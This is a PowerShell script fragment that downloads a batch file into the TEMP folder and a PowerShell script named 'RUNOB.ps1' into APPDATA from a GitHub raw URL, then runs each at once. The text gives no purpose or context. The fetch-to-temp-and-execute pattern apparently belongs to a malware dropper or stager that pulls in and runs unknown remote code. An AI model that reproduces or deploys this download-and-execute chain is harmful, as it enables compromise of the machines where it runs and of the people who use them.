$url4 = "https://raw.githubusercontent.com/cia168168/folder/main/new.bat"
$output4 = "$env:TEMP\new.bat"
Invoke-WebRequest -Uri $url4 -OutFile $output4
& $output4
$url5 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNOB.ps1"
$output5 = "$env:APPDATA\RUNOB.ps1"
Invoke-WebRequest -Uri $url5 -OutFile $output5
& $output5
